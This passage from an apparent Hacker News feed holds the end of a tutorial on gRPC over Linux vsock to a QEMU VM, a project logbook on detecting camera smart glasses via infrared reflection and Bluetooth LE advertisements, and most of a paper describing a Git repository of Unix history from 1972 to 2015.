        "//proto:vsock_service_cc_grpc",
        "//proto:vsock_service_cc_proto",
    ],
    linkstatic = True,
    linkopts = [
        "-static",
    ],
)&lt;/code&gt;
    &lt;p&gt;And the C++ code:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;memory&amp;gt;
#include &amp;lt;string&amp;gt;

#include &amp;lt;grpc++/grpc++.h&amp;gt;
#include "proto/vsock_service.grpc.pb.h"

using grpc::Channel;
using grpc::ClientContext;
using grpc::Status;
using popovicu_vsock::VsockService;
using popovicu_vsock::AdditionRequest;
using popovicu_vsock::AdditionResponse;

class VsockClient {
 public:
  VsockClient(std::shared_ptr&amp;lt;Channel&amp;gt; channel)
      : stub_(VsockService::NewStub(channel)) {}

  int32_t Add(int32_t a, int32_t b) {
    AdditionRequest request;
    request.set_a(a);
    request.set_b(b);

    AdditionResponse response;
    ClientContext context;

    Status status = stub_-&amp;gt;Addition(&amp;amp;context, request, &amp;amp;response);

    if (status.ok()) {
      return response.c();
    } else {
      std::cout &amp;lt;&amp;lt; "RPC failed: " &amp;lt;&amp;lt; status.error_code() &amp;lt;&amp;lt; ": "
                &amp;lt;&amp;lt; status.error_message() &amp;lt;&amp;lt; std::endl;
      return -1;
    }
  }

 private:
  std::unique_ptr&amp;lt;VsockService::Stub&amp;gt; stub_;
};

int main() {
  // Client running on host, connecting to VM server
  // vsock:3:9999 means connect to CID 3 (guest VM) on port 9999
  // CID 3 is an example - adjust based on your VM's actual CID
  std::string server_address("vsock:3:9999");

  VsockClient client(
      grpc::CreateChannel(server_address, grpc::InsecureChannelCredentials()));

  int32_t a = 5;
  int32_t b = 7;
  int32_t result = client.Add(a, b);

  std::cout &amp;lt;&amp;lt; "Addition result: " &amp;lt;&amp;lt; a &amp;lt;&amp;lt; " + " &amp;lt;&amp;lt; b &amp;lt;&amp;lt; " = " &amp;lt;&amp;lt; result
            &amp;lt;&amp;lt; std::endl;

  return 0;
}&lt;/code&gt;
    &lt;head rend="h2"&gt;Running it all together&lt;/head&gt;
    &lt;p&gt;Bazel shines here. You only need a working C++ compiler on your host system. Bazel automatically fetches and builds everything else on the fly, including the Protobuf compiler.&lt;/p&gt;
    &lt;p&gt;To get the statically linked server binary:&lt;/p&gt;
    &lt;code&gt;bazel build //server&lt;/code&gt;
    &lt;p&gt;Similarly, for the client:&lt;/p&gt;
    &lt;code&gt;bazel build //client&lt;/code&gt;
    &lt;p&gt;To create a VM image, I used &lt;code&gt;debootstrap&lt;/code&gt; on an &lt;code&gt;ext4&lt;/code&gt; image, as described in this post on X:&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Stop downloading 4GB ISOs to create Linux VMs.&lt;/p&gt;— Uros Popovic (@popovicu94) November 25, 2025&lt;lb/&gt;You don't need an installer, a GUI, or a "Next &amp;gt; Next &amp;gt; Finish" wizard. You just need a directory of files.&lt;lb/&gt;Here is how I build custom, hacky, bootable Debian VMs in 60 seconds using debootstrap.&lt;lb/&gt;Your distro is just a kernel and a… pic.twitter.com/l4mM02zPmr&lt;/quote&gt;
    &lt;p&gt;This is a quick, albeit hacky, solution for creating a runnable Debian instance.&lt;/p&gt;
    &lt;p&gt;Next, I copied the newly built server binary to &lt;code&gt;/opt&lt;/code&gt; within the image.&lt;/p&gt;
    &lt;p&gt;Now, the VM can be booted straight into the server binary as soon as the kernel runs:&lt;/p&gt;
    &lt;code&gt; qemu-system-x86_64 -m 1G -kernel /tmp/linux/linux-6.17.2/arch/x86/boot/bzImage \
  -nographic \
  -append "console=ttyS0 init=/opt/server root=/dev/vda rw" \
  --enable-kvm \
  -smp 8 \
  -drive file=./debian.qcow2,format=qcow2,if=virtio -device vhost-vsock-pci,guest-cid=3&lt;/code&gt;
    &lt;p&gt;As shown in the last line, a virtual device is attached to the QEMU VM acting as &lt;code&gt;vsock&lt;/code&gt; networking hardware, configured with CID 3.&lt;/p&gt;
    &lt;p&gt;The QEMU output shows:&lt;/p&gt;
    &lt;code&gt;[    1.581192] Run /opt/server as init process
[    1.889382] random: crng init done
Server listening on vsock:3:9999&lt;/code&gt;
    &lt;p&gt;To send an RPC to the server from the host, I ran the client binary:&lt;/p&gt;
    &lt;code&gt;bazel run //client&lt;/code&gt;
    &lt;p&gt;The output confirmed the result:&lt;/p&gt;
    &lt;code&gt;Addition result: 5 + 7 = 12&lt;/code&gt;
    &lt;p&gt;Correspondingly, the server output displayed:&lt;/p&gt;
    &lt;code&gt;Addition: 5 + 7 = 12&lt;/code&gt;
    &lt;p&gt;We have successfully invoked an RPC from the host to the VM!&lt;/p&gt;
    &lt;head rend="h2"&gt;Under the hood&lt;/head&gt;
    &lt;p&gt;I haven’t delved into the low-level system API for &lt;code&gt;vsock&lt;/code&gt;s, as frameworks typically abstract this away. However, &lt;code&gt;vsock&lt;/code&gt;s closely resemble TCP/IP sockets. Once created, they are used in the same way, though the creation API differs. Information on this is readily available online.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;I believed it was more valuable to focus on a high-level RPC system over &lt;code&gt;vsock&lt;/code&gt; rather than raw sockets. With gRPC, you can invoke a structured RPC on a server running inside the VM. This opens the door to running interesting applications in sealed, isolated environments, allowing you to easily combine different OSes (e.g., a Debian host and an Arch guest) or any platform supporting &lt;code&gt;vsock&lt;/code&gt;. Additionally, gRPC allows you to write clients and servers in many different languages and technologies. This is achieved without network virtualization, resulting in increased efficiency.&lt;/p&gt;
    &lt;p&gt;I hope this was fun and useful to you as well.&lt;/p&gt;
    &lt;p&gt;Please consider following me on X and LinkedIn for further updates.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://popovicu.com/posts/how-to-use-linux-vsock-for-fast-vm-communication/"/><published>2025-11-28T05:19:45+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46075882</id><title>Show HN: Glasses to detect smart-glasses that have cameras</title><updated>2025-11-28T11:33:51.003904+00:00</updated><content>&lt;doc fingerprint="37a0505728a445d9"&gt;
  &lt;main&gt;
    &lt;p&gt;Glasses to detect smart-glasses that have cameras&lt;/p&gt;
    &lt;p&gt;I'm experimenting with 2 main approaches:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Optics: classify the camera using light reflections.&lt;/item&gt;
      &lt;item&gt;Networking: bluetooth and wi-fi analysis.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;So far fingerprinting specific devices based on bluetooth (BLE) is looking like easiest and most reliable approach. The picture below is the first version, which plays the legend of zelda 'secret found' jingle when it detects a BLE advertisement from Meta Raybans.&lt;/p&gt;
    &lt;p&gt;I'm essentially treating this README like a logbook, so it will have my current approaches/ideas.&lt;/p&gt;
    &lt;p&gt;By sending IR at camera lenses, we can take advantage of the fact that the CMOS sensor in a camera reflects light directly back at the source (called 'retro-reflectivity' / 'cat-eye effect') to identify cameras.&lt;/p&gt;
    &lt;p&gt;This isn't exactly a new idea. Some researchers in 2005 used this property to create 'capture-resistant environments' when smartphones with cameras were gaining popularity.&lt;/p&gt;
    &lt;p&gt;There's even some recent research (2024) that figured out how to classify individual cameras based on their retro-reflections.&lt;/p&gt;
    &lt;p&gt;Now we have a similar situation to those 2005 researchers on our hands, where smart glasses with hidden cameras seem to be getting more popular. So I want to create a pair of glasses to identify these. Unfortunately, from what I can tell most of the existing research in this space records data with a camera and then uses ML, a ton of controlled angles, etc. to differentiate between normal reflective surfaces and cameras.&lt;/p&gt;
    &lt;p&gt;I would feel pretty silly if my solution uses its own camera. So I'll be avoiding that. Instead I think it's likely I'll have to rely on being consistent with my 'sweeps', and creating a good classifier based on signal data. For example you can see here that the back camera on my smartphone seems to produce quick and large spikes, while the glossy screen creates a more prolonged wave.&lt;/p&gt;
    &lt;p&gt;After getting to test some Meta Raybans, I found that this setup is not going to be sufficient. Here's a test of some sweeps of the camera-area + the same area when the lens is covered. You can see the waveform is similar to what I saw in the earlier test (short spike for camera, wider otherwise), but it's wildly inconsistent and the strength of the signal is very weak. This was from about 4 inches away from the LEDs. I didn't notice much difference when swapping between 940nm and 850nm LEDs.&lt;/p&gt;
    &lt;p&gt;So at least with current hardware that's easy for me to access, this probably isn't enough to differentiate accurately.&lt;/p&gt;
    &lt;p&gt;Another idea I had is to create a designated sweep 'pattern'. The user (wearing the detector glasses) would perform a specific scan pattern of the target. Using the waveforms captured from this data, maybe we can more accurately fingerprint the raybans. For example, sweeping across the targets glasses in a 'left, right, up, down' approach. I tested this by comparing the results of the Meta raybans vs some aviators I had lying around. I think the idea behind this approach is sound (actually it's light), but it might need more workshopping.&lt;/p&gt;
    &lt;p&gt;For prototyping, I'm using:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Arduino uno&lt;/item&gt;
      &lt;item&gt;a bunch of 940nm and 850nm IR LEDs&lt;/item&gt;
      &lt;item&gt;a photodiode as a receiver&lt;/item&gt;
      &lt;item&gt;a 2222A transistor&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;TODO:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;experiment with sweeping patterns&lt;/item&gt;
      &lt;item&gt;experiment with combining data from different wavelengths&lt;/item&gt;
      &lt;item&gt;collimation?&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This has been more tricky than I first thought! My current approach here is to fingerprint the Meta Raybans over Bluetooth low-energy (BLE) advertisements. But, I have only been able to detect BLE traffic during 1) pairing 2) powering-on. I sometimes also see the advertisement as they are taken out of the case (while already powered on), but not consistently.&lt;/p&gt;
    &lt;p&gt;The goal is to detect them during usage when they're communicating with the paired phone, but to see this type of directed BLE traffic it seems like I would first need to see the &lt;code&gt;CONNECT_REQ&lt;/code&gt; packet which has information as to what which of the communication channels to hop between in sync. I don't think what I currently have (ESP32) is set up to do this kind of following.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;potentially can use an nRF module for this&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For any of the bluetooth classic (BTC) traffic, unfortunately the hardware seems a bit more involved (read: expensive). So if I want to do down this route, I'll likely need a more clever solution here.&lt;/p&gt;
    &lt;p&gt;When turned on or put into pairing mode (or sometimes when taken out of the case), I can detect the device through advertised manufacturer data and service UUIDs. &lt;code&gt;0x01AB&lt;/code&gt; is a Meta-specific SIG-assigned ID (assigned by the Bluetooth standards body), and &lt;code&gt;0xFD5F&lt;/code&gt; in the Service UUID is assigned to Meta as well.&lt;/p&gt;
    &lt;p&gt;capture when the glasses are powered on:&lt;/p&gt;
    &lt;code&gt;[01:07:06] RSSI: -59 dBm
Address: XX:XX:XX:XX:XX:XX
Name: Unknown

META/LUXOTTICA DEVICE DETECTED!
  Manufacturer: Meta (0x01AB)
  Service UUID: Meta (0xFD5F) (0000fd5f-0000-1000-8000-00805f9b34fb)

Manufacturer Data:
  Company ID: Meta (0x01AB)
  Data: 020102102716e4

Service UUIDs: ['0000fd5f-0000-1000-8000-00805f9b34fb']
&lt;/code&gt;
    &lt;p&gt;IEEE assigns certain MAC address prefixes (OUI, 'Organizationally Unique Identifier'), but these addresses get randomized so I don't expect them to be super useful for BLE.&lt;/p&gt;
    &lt;p&gt;Here's some links to more data if you're curious:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;https://www.bluetooth.com/wp-content/uploads/Files/Specification/HTML/Assigned_Numbers/out/en/Assigned_Numbers.pdf&lt;/item&gt;
      &lt;item&gt;https://gitlab.com/wireshark/wireshark/-/blob/99df5f588b38cc0964f998a6a292e81c7dcf0800/epan/dissectors/packet-bluetooth.c&lt;/item&gt;
      &lt;item&gt;https://www.netify.ai/resources/macs/brands/meta&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;TODO:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Read: https://dl.acm.org/doi/10.1145/3548606.3559372&lt;/item&gt;
      &lt;item&gt;try active probing/interrogating&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Thanks to Trevor Seets and Junming Chen for their advice in optics and BLE (respectively). Also to Sohail for lending me meta raybans to test with.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/NullPxl/banrays"/><published>2025-11-28T05:52:38+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46077038</id><title>Tech Titans Amass Multimillion-Dollar War Chests to Fight AI Regulation</title><updated>2025-11-28T11:33:50.795735+00:00</updated><content/><link href="https://www.wsj.com/tech/ai/tech-titans-amass-multimillion-dollar-war-chests-to-fight-ai-regulation-88c600e1"/><published>2025-11-28T09:21:55+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46077106</id><title>A Repository with 44 Years of Unix Evolution</title><updated>2025-11-28T11:33:49.616725+00:00</updated><content>&lt;doc fingerprint="b714999f6ea38799"&gt;
  &lt;main&gt;
    &lt;div&gt;&lt;head rend="h1"&gt;A Repository with 44 Years of Unix Evolution &lt;/head&gt;&lt;head rend="h2"&gt; Abstract&lt;/head&gt;&lt;p&gt; The evolution of the Unix operating system is made available as a version-control repository, covering the period from its inception in 1972 as a five thousand line kernel, to 2015 as a widely-used 26 million line system. The repository contains 659 thousand commits and 2306 merges. The repository employs the commonly used Git system for its storage, and is hosted on the popular GitHub archive. It has been created by synthesizing with custom software 24 snapshots of systems developed at Bell Labs, Berkeley University, and the 386BSD team, two legacy repositories, and the modern repository of the open source FreeBSD system. In total, 850 individual contributors are identified, the early ones through primary research. The data set can be used for empirical research in software engineering, information systems, and software archaeology. &lt;/p&gt;&lt;head rend="h2"&gt; 1 Introduction&lt;/head&gt;&lt;p&gt; The Unix operating system stands out as a major engineering breakthrough due to its exemplary design, its numerous technical contributions, its development model, and its widespread use. The design of the Unix programming environment has been characterized as one offering unusual simplicity, power, and elegance [&lt;/p&gt;1&lt;p&gt;]. On the technical side, features that can be directly attributed to Unix or were popularized by it include [&lt;/p&gt;2&lt;p&gt;]: the portable implementation of the kernel in a high level language; a hierarchical file system; compatible file, device, networking, and inter-process I/O; the pipes and filters architecture; virtual file systems; and the shell as a user-selectable regular process. A large community contributed software to Unix from its early days [&lt;/p&gt;3&lt;p&gt;], [&lt;/p&gt;4&lt;p&gt;,pp. 65-72]. This community grew immensely over time and worked using what are now termed open source software development methods [&lt;/p&gt;5&lt;p&gt;,pp. 440-442]. Unix and its intellectual descendants have also helped the spread of the C and C++ programming languages, parser and lexical analyzer generators (&lt;/p&gt;yacc&lt;p&gt;, &lt;/p&gt;lex&lt;p&gt;), document preparation tools (&lt;/p&gt;troff&lt;p&gt;, &lt;/p&gt;eqn&lt;p&gt;, &lt;/p&gt;tbl&lt;p&gt;), scripting languages (&lt;/p&gt;awk&lt;p&gt;, &lt;/p&gt;sed&lt;p&gt;, &lt;/p&gt;Perl&lt;p&gt;), TCP/IP networking, and configuration management systems (&lt;/p&gt;SCCS&lt;p&gt;, &lt;/p&gt;RCS&lt;p&gt;, &lt;/p&gt;Subversion&lt;p&gt;, &lt;/p&gt;Git&lt;p&gt;), while also forming a large part of the modern internet infrastructure and the web. &lt;/p&gt;&lt;p&gt; Luckily, important Unix material of historical importance has survived and is nowadays openly available. Although Unix was initially distributed with relatively restrictive licenses, the most significant parts of its early development have been released by one of its right-holders (Caldera International) under a liberal license. Combining these parts with software that was developed or released as open source software by the University of California, Berkeley and the FreeBSD Project provides coverage of the system's development over a period ranging from June 20th 1972 until today. &lt;/p&gt;&lt;p&gt; Curating and processing available snapshots as well as old and modern configuration management repositories allows the reconstruction of a new synthetic Git repository that combines under a single roof most of the available data. This repository documents in a digital form the detailed evolution of an important digital artefact over a period of 44 years. The following sections describe the repository's structure and contents (Section &lt;/p&gt;II&lt;p&gt;), the way it was created (Section &lt;/p&gt;III&lt;p&gt;), and how it can be used (Section &lt;/p&gt;IV&lt;p&gt;). &lt;/p&gt;&lt;head rend="h2"&gt; 2 Data Overview&lt;/head&gt;&lt;p&gt; The 1GB Unix history Git repository is made available for cloning on &lt;/p&gt;GitHub&lt;p&gt;.&lt;/p&gt;1&lt;p&gt; Currently&lt;/p&gt;2&lt;p&gt; the repository contains 659 thousand commits and 2306 merges from about 850 contributors. The contributors include 23 from the Bell Labs staff, 158 from Berkeley's Computer Systems Research Group (CSRG), and 660 from the FreeBSD Project. &lt;/p&gt;&lt;p&gt; The repository starts its life at a tag identified as &lt;/p&gt;Epoch&lt;p&gt;, which contains only licensing information and its modern README file. Various tag and branch names identify points of significance. &lt;/p&gt;&lt;list rend="ul"&gt;&lt;item&gt; Research-VX tags correspond to six research editions that came out of Bell Labs. These start with Research-V1 (4768 lines of PDP-11 assembly) and end with Research-V7 (1820 mostly C files, 324kLOC). &lt;/item&gt;&lt;item&gt; Bell-32V is the port of the 7th Edition Unix to the DEC/VAX architecture. &lt;/item&gt;&lt;item&gt; BSD-X tags correspond to 15 snapshots released from Berkeley. &lt;/item&gt;&lt;item&gt; 386BSD-X tags correspond to two open source versions of the system, with the Intel 386 architecture kernel code mainly written by Lynne and William Jolitz. &lt;/item&gt;&lt;item&gt; FreeBSD-release/X tags and branches mark 116 releases coming from the FreeBSD project. &lt;/item&gt;&lt;/list&gt;&lt;p&gt; In addition, branches with a &lt;/p&gt;-Snapshot-Development&lt;p&gt; suffix denote commits that have been synthesized from a time-ordered sequence of a snapshot's files, while tags with a &lt;/p&gt;-VCS-Development&lt;p&gt; suffix mark the point along an imported version control history branch where a particular release occurred. &lt;/p&gt;&lt;p&gt; The repository's history includes commits from the earliest days of the system's development, such as the following. &lt;/p&gt;&lt;quote&gt; commit c9f643f59434f14f774d61ee3856972b8c3905b1 Author: Dennis Ritchie &amp;lt;research!dmr&amp;gt; Date: Mon Dec 2 18:18:02 1974 -0500 Research V5 development Work on file usr/sys/dmr/kl.c &lt;/quote&gt;&lt;p&gt; Merges between releases that happened along the system's evolution, such as the development of BSD 3 from BSD 2 and Unix 32/V, are also correctly represented in the Git repository as graph nodes with two parents. &lt;/p&gt;&lt;p&gt; More importantly, the repository is constructed in a way that allows &lt;/p&gt;git blame&lt;p&gt;, which annotates source code lines with the version, date, and author associated with their first appearance, to produce the expected code provenance results. For example, checking out the &lt;/p&gt;BSD-4&lt;p&gt; tag, and running &lt;/p&gt;git blame&lt;p&gt; on the kernel's &lt;/p&gt;pipe.c&lt;p&gt; file will show lines written by Ken Thompson in 1974, 1975, and 1979, and by Bill Joy in 1980. This allows the automatic (though computationally expensive) detection of the code's provenance at any point of time. &lt;/p&gt;&lt;p&gt;Figure 1: Code provenance across significant Unix releases.&lt;/p&gt;&lt;p&gt; As can be seen in Figure &lt;/p&gt;1&lt;p&gt;, a modern version of Unix (FreeBSD 9) still contains visible chunks of code from BSD 4.3, BSD 4.3 Net/2, and FreeBSD 2.0. Interestingly, the Figure shows that code developed during the frantic dash to create an open source operating system out of the code released by Berkeley (386BSD and FreeBSD 1.0) does not seem to have survived. The oldest code in FreeBSD 9 appears to be an 18-line sequence in the C library file &lt;/p&gt;timezone.c&lt;p&gt;, which can also be found in the 7th Edition Unix file with the same name and a time stamp of January 10th, 1979 - 36 years ago. &lt;/p&gt;&lt;head rend="h2"&gt; 3 Data Collection and Processing&lt;/head&gt;&lt;p&gt; The goal of the project is to consolidate data concerning the evolution of Unix in a form that helps the study of the system's evolution, by entering them into a modern revision repository. This involves collecting the data, curating them, and synthesizing them into a single Git repository. &lt;/p&gt;&lt;p&gt;Figure 2: Imported Unix snapshots, repositories, and their mergers.&lt;/p&gt;&lt;p&gt; The project is based on three types of data (see Figure &lt;/p&gt;2&lt;p&gt;). First, &lt;/p&gt;snapshots of early released versions&lt;p&gt;, which were obtained from the &lt;/p&gt;Unix Heritage Society archive&lt;p&gt;,&lt;/p&gt;3&lt;p&gt; the &lt;/p&gt;CD-ROM images&lt;p&gt; containing the full source archives of CSRG,&lt;/p&gt;4&lt;p&gt; the &lt;/p&gt;OldLinux site&lt;p&gt;,&lt;/p&gt;5&lt;p&gt; and the &lt;/p&gt;FreeBSD archive&lt;p&gt;.&lt;/p&gt;6&lt;p&gt; Second, &lt;/p&gt;past and current repositories&lt;p&gt;, namely the CSRG SCCS [&lt;/p&gt;6&lt;p&gt;] repository, the FreeBSD 1 CVS repository, and the &lt;/p&gt;Git mirror of modern FreeBSD development&lt;p&gt;.&lt;/p&gt;7&lt;p&gt; The first two were obtained from the same sources as the corresponding snapshots. &lt;/p&gt;&lt;p&gt; The last, and most labour intensive, source of data was &lt;/p&gt;primary research&lt;p&gt;. The release snapshots do not provide information regarding their ancestors and the contributors of each file. Therefore, these pieces of information had to be determined through primary research. The authorship information was mainly obtained by reading author biographies, research papers, internal memos, and old documentation scans; by reading and automatically processing source code and manual page markup; by communicating via email with people who were there at the time; by posting a query on the Unix &lt;/p&gt;StackExchange&lt;p&gt; site; by looking at the location of files (in early editions the kernel source code was split into &lt;/p&gt;usr/sys/dmr&lt;p&gt; and &lt;/p&gt;/usr/sys/ken&lt;p&gt;); and by propagating authorship from research papers and manual pages to source code and from one release to others. (Interestingly, the 1st and 2nd Research Edition manual pages have an "owner" section, listing the person (e.g. &lt;/p&gt;ken&lt;p&gt;) associated with the corresponding system command, file, system call, or library function. This section was not there in the 4th Edition, and resurfaced as the "Author" section in BSD releases.) Precise details regarding the source of the authorship information are documented in the project's files that are used for mapping Unix source code files to their authors and the corresponding commit messages. Finally, information regarding merges between source code bases was obtained from a &lt;/p&gt;BSD family tree maintained by the NetBSD project&lt;p&gt;.&lt;/p&gt;8 &lt;p&gt; The software and data files that were developed as part of this project, are &lt;/p&gt;available online&lt;p&gt;,&lt;/p&gt;9&lt;p&gt; and, with appropriate network, CPU and disk resources, they can be used to recreate the repository from scratch. The authorship information for major releases is stored in files under the project's &lt;/p&gt;author-path&lt;p&gt; directory. These contain lines with a regular expressions for a file path followed by the identifier of the corresponding author. Multiple authors can also be specified. The regular expressions are processed sequentially, so that a catch-all expression at the end of the file can specify a release's default authors. To avoid repetition, a separate file with a &lt;/p&gt;.au&lt;p&gt; suffix is used to map author identifiers into their names and emails. One such file has been created for every community associated with the system's evolution: Bell Labs, Berkeley, 386BSD, and FreeBSD. For the sake of authenticity, emails for the early Bell Labs releases are listed in UUCP notation (e.g. &lt;/p&gt;research!ken&lt;p&gt;). The FreeBSD author identifier map, required for importing the early CVS repository, was constructed by extracting the corresponding data from the project's modern Git repository. In total the commented authorship files (828 rules) comprise 1107 lines, and there are another 640 lines mapping author identifiers to names. &lt;/p&gt;&lt;p&gt; The curation of the project's data sources has been codified into a 168-line &lt;/p&gt;Makefile&lt;p&gt;. It involves the following steps. &lt;/p&gt; Fetching &lt;p&gt; Copying and cloning about 11GB of images, archives, and repositories from remote sites. &lt;/p&gt; Tooling &lt;p&gt; Obtaining an archiver for old PDP-11 archives from 2.9 BSD, and adjusting it to compile under modern versions of Unix; compiling the 4.3 BSD &lt;/p&gt;compress&lt;p&gt; program, which is no longer part of modern Unix systems, in order to decompress the 386BSD distributions. &lt;/p&gt; Organizing &lt;p&gt; Unpacking archives using &lt;/p&gt;tar&lt;p&gt; and &lt;/p&gt;cpio&lt;p&gt;; combining three 6th Research Edition directories; unpacking all 1 BSD archives using the old PDP-11 archiver; mounting CD-ROM images so that they can be processed as file systems; combining the 8 and 62 386BSD floppy disk images into two separate files. &lt;/p&gt; Cleaning &lt;p&gt; Restoring the 1st Research Edition kernel source code files, which were obtained from printouts through optical character recognition, into a format close to their original state; patching some 7th Research Edition source code files; removing metadata files and other files that were added after a release, to avoid obtaining erroneous time stamp information; patching corrupted SCCS files; processing the early FreeBSD CVS repository by removing CVS symbols assigned to multiple revisions with a custom Perl script, deleting CVS &lt;/p&gt;Attic&lt;p&gt; files clashing with live ones, and converting the CVS repository into a Git one using &lt;/p&gt;cvs2svn&lt;p&gt;. &lt;/p&gt;&lt;p&gt; An interesting part of the repository representation is how snapshots are imported and linked together in a way that allows &lt;/p&gt;git blame&lt;p&gt; to perform its magic. Snapshots are imported into the repository as sequential commits based on the time stamp of each file. When all files have been imported the repository is tagged with the name of the corresponding release. At that point one could delete those files, and begin the import of the next snapshot. Note that the &lt;/p&gt;git blame&lt;p&gt; command works by traversing backwards a repository's history, and using heuristics to detect code moving and being copied within or across files. Consequently, deleted snapshots would create a discontinuity between them, and prevent the tracing of code between them. &lt;/p&gt;&lt;p&gt; Instead, before the next snapshot is imported, all the files of the preceding snapshot are moved into a hidden look-aside directory named &lt;/p&gt;.ref&lt;p&gt; (reference). They remain there, until all files of the next snapshot have been imported, at which point they are deleted. Because every file in the &lt;/p&gt;.ref&lt;p&gt; directory matches exactly an original file, &lt;/p&gt;git blame&lt;p&gt; can determine how source code moves from one version to the next via the &lt;/p&gt;.ref&lt;p&gt; file, without ever displaying the &lt;/p&gt;.ref&lt;p&gt; file. To further help the detection of code provenance, and to increase the representation's realism, each release is represented as a merge between the branch with the incremental file additions (&lt;/p&gt;-Development&lt;p&gt;) and the preceding release. &lt;/p&gt;&lt;p&gt; For a period in the 1980s, only a subset of the files developed at Berkeley were under SCCS version control. During that period our unified repository contains imports of both the SCCS commits, and the snapshots' incremental additions. At the point of each release, the SCCS commit with the nearest time stamp is found and is marked as a merge with the release's incremental import branch. These merges can be seen in the middle of Figure &lt;/p&gt;2&lt;p&gt;. &lt;/p&gt;&lt;p&gt; The synthesis of the various data sources into a single repository is mainly performed by two scripts. A 780-line Perl script (&lt;/p&gt;import-dir.pl&lt;p&gt;) can export the (real or synthesized) commit history from a single data source (snapshot directory, SCCS repository, or Git repository) in the &lt;/p&gt;Git fast export&lt;p&gt; format. The output is a simple text format that Git tools use to import and export commits. Among other things, the script takes as arguments the mapping of files to contributors, the mapping between contributor login names and their full names, the commit(s) from which the import will be merged, which files to process and which to ignore, and the handling of "reference" files. A 450-line shell script creates the Git repository and calls the Perl script with appropriate arguments to import each one of the 27 available historical data sources. The shell script also runs 30 tests that compare the repository at specific tags against the corresponding data sources, verify the appearance and disappearance of look-aside directories, and look for regressions in the count of tree branches and merges and the output of &lt;/p&gt;git blame&lt;p&gt; and &lt;/p&gt;git log&lt;p&gt;. Finally, &lt;/p&gt;git&lt;p&gt; is called to garbage-collect and compress the repository from its initial 6GB size down to the distributed 1GB. &lt;/p&gt;&lt;head rend="h2"&gt; 4 Data Uses&lt;/head&gt;&lt;p&gt; The data set can be used for empirical research in software engineering, information systems, and software archeology. Through its unique uninterrupted coverage of a period of more than 40 years, it can inform work on software evolution and handovers across generations. With thousandfold increases in processing speed and million-fold increases in storage capacity during that time, the data set can also be used to study the co-evolution of software and hardware technology. The move of the software's development from research labs, to academia, and to the open source community can be used to study the effects of organizational culture on software development. The repository can also be used to study how notable individuals, such as Turing Award winners (Dennis Ritchie and Ken Thompson) and captains of the IT industry (Bill Joy and Eric Schmidt), actually programmed. Another phenomenon worthy of study concerns the longevity of code, either at the level of individual lines, or as complete systems that were at times distributed with Unix (Ingres, Lisp, Pascal, Ratfor, Snobol, TMG), as well as the factors that lead to code's survival or demise. Finally, because the data set stresses Git, the underlying software repository storage technology, to its limits, it can be used to drive engineering progress in the field of revision management systems. &lt;/p&gt;&lt;p&gt;Figure 3: Code style evolution along Unix releases.&lt;/p&gt;&lt;p&gt; Figure &lt;/p&gt;3&lt;p&gt;, which depicts trend lines (obtained with R's local polynomial regression fitting function) of some interesting code metrics along 36 major releases of Unix, demonstrates the evolution of code style and programming language use over very long timescales. This evolution can be driven by software and hardware technology affordances and requirements, software construction theory, and even social forces. The dates in the Figure have been calculated as the average date of all files appearing in a given release. As can be seen in it, over the past 40 years the mean length of identifiers and file names has steadily increased from 4 and 6 characters to 7 and 11 characters, respectively. We can also see less steady increases in the number of comments and decreases in the use of the &lt;/p&gt;goto&lt;p&gt; statement, as well as the virtual disappearance of the &lt;/p&gt;register&lt;p&gt; type modifier. &lt;/p&gt;&lt;head rend="h2"&gt; 5 Further Work&lt;/head&gt;&lt;p&gt; Many things can be done to increase the repository's faithfulness and usefulness. Given that the build process is shared as open source code, it is easy to contribute additions and fixes through GitHub pull requests. The most useful community contribution would be to increase the coverage of imported snapshot files that are attributed to a specific author. Currently, about 90 thousand files (out of a total of 160 thousand) are getting assigned an author through a default rule. Similarly, there are about 250 authors (primarily early FreeBSD ones) for which only the identifier is known. Both are listed in the build repository's &lt;/p&gt;unmatched&lt;p&gt; directory, and contributions are welcomed. Furthermore, the BSD SCCS and the FreeBSD CVS commits that share the same author and time-stamp can be coalesced into a single Git commit. Support can be added for importing the SCCS file comment fields, in order to bring into the repository the corresponding metadata. Finally, and most importantly, more branches of open source systems can be added, such as NetBSD OpenBSD, DragonFlyBSD, and &lt;/p&gt;illumos&lt;p&gt;. Ideally, current right holders of other important historical Unix releases, such as System III, System V, NeXTSTEP, and SunOS, will release their systems under a license that would allow their incorporation into this repository for study. &lt;/p&gt;&lt;head rend="h3"&gt;Acknowledgements&lt;/head&gt; The author thanks the many individuals who contributed to the effort. Brian W. Kernighan, Doug McIlroy, and Arnold D. Robbins helped with Bell Labs login identifiers. Clem Cole, Era Eriksson, Mary Ann Horton, Kirk McKusick, Jeremy C. Reed, Ingo Schwarze, and Anatole Shaw helped with BSD login identifiers. The BSD SCCS import code is based on work by H. Merijn Brand and Jonathan Gray. This research has been co-financed by the European Union (European Social Fund - ESF) and Greek national funds through the Operational Program "Education and Lifelong Learning" of the National Strategic Reference Framework (NSRF) - Research Funding Program: Thalis - Athens University of Economics and Business - Software Engineering Research Platform. &lt;head rend="h2"&gt;References&lt;/head&gt;&lt;list rend="dl"&gt;&lt;item rend="dt-1"&gt;[1]&lt;/item&gt;&lt;item rend="dd-1"&gt; M. D. McIlroy, E. N. Pinson, and B. A. Tague, "UNIX time-sharing system: 